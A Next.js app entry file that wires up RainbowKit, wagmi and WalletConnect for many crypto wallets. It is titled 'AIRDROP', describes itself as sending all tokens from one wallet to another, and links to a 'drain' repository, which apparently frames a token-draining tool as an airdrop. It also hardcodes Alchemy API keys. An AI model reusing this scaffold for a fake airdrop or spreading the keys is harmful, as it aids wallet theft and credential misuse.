import { useEffect, useState } from 'react';
import { CssBaseline, GeistProvider } from '@geist-ui/core';
import type { AppProps } from 'next/app';
import NextHead from 'next/head';
import GithubCorner from 'react-github-corner';
import '../styles/globals.css';

// Imports
import { createConfig, WagmiProvider, http } from 'wagmi';
import { RainbowKitProvider, connectorsForWallets } from '@rainbow-me/rainbowkit';
import '@rainbow-me/rainbowkit/styles.css';
import { chains } from '../chain'; // Importing from your custom chains file
import { useIsMounted } from '../hooks';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';

// Import WalletConnect packages
import { Core } from '@walletconnect/core';
import { Web3Wallet } from '@walletconnect/web3wallet';

// Import wallet configurations
import {
  rainbowWallet,
  walletConnectWallet,
  coinbaseWallet,
  trustWallet,
  uniswapWallet,
  okxWallet,
  metaMaskWallet,
  bybitWallet,
  binanceWallet,
} from '@rainbow-me/rainbowkit/wallets';

// Define WalletConnect projectId
const projectId = process.env.NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID || 'dce4c19a5efd3cba4116b12d4fc3689a';

// Define connectors
const connectors = connectorsForWallets([
  {
    groupName: 'Recommended',
    wallets: [coinbaseWallet, trustWallet, rainbowWallet, metaMaskWallet, walletConnectWallet],
  },
  {
    groupName: 'More',
    wallets: [binanceWallet, bybitWallet, okxWallet, trustWallet, uniswapWallet],
  },
], {
  appName: 'Test App',
  projectId: projectId,
});

// Configure wagmi
const wagmiConfig = createConfig({
  connectors,
  chains,
  transports: {
    1: http('https://eth-mainnet.g.alchemy.com/v2/iUoZdhhu265uyKgw-V6FojhyO80OKfmV'),
    137: http('https://polygon-mainnet.g.alchemy.com/v2/iUoZdhhu265uyKgw-V6FojhyO80OKfmV'),
    10: http('https://opt-mainnet.g.alchemy.com/v2/iUoZdhhu265uyKgw-V6FojhyO80OKfmV'),
    42161: http('https://arb-mainnet.g.alchemy.com/v2/iUoZdhhu265uyKgw-V6FojhyO80OKfmV'),
    324: http('https://zksync-mainnet.g.alchemy.com/v2/iUoZdhhu265uyKgw-V6FojhyO80OKfmV'),
  },
});

const queryClient = new QueryClient();

const App = ({ Component, pageProps }: AppProps) => {
  const [web3wallet, setWeb3Wallet] = useState<InstanceType<typeof Web3Wallet> | null>(null);
  const isMounted = useIsMounted();

  useEffect(() => {
    const initializeWalletConnect = async () => {
      try {
        const core = new Core({
          projectId: projectId
        });

        const metadata = {
          name: 'Test App',
          description: 'AppKit Example',
          url: 'https://web3modal.com',
          icons: ['https://avatars.githubusercontent.com/u/37784886']
        };

        const wallet = await Web3Wallet.init({
          core,
          metadata
        });

        setWeb3Wallet(wallet);
        console.log('WalletConnect initialized successfully');
      } catch (error) {
        console.error('Error initializing WalletConnect:', error);
      }
    };

    if (isMounted) {
      initializeWalletConnect();
    }
  }, [isMounted]);

  // Always render the providers and wrap the entire application
  return (
    <QueryClientProvider client={queryClient}>
      <WagmiProvider config={wagmiConfig}>
        <RainbowKitProvider>
          <NextHead>
            <title>AIRDROP</title>
            <meta name="description" content="Send all tokens from one wallet to another" />
            <link rel="icon" href="/favicon.ico" />
          </NextHead>
          <GeistProvider>
            <CssBaseline />
            <GithubCorner href="https://github.com/dawsbot/drain" size="140" bannerColor="#e056fd" />
            {/* Conditionally render the main component based on wallet initialization */}
            {isMounted && web3wallet ? <Component {...pageProps} /> : null}
          </GeistProvider>
        </RainbowKitProvider>
      </WagmiProvider>
    </QueryClientProvider>
  );
};

export default App;
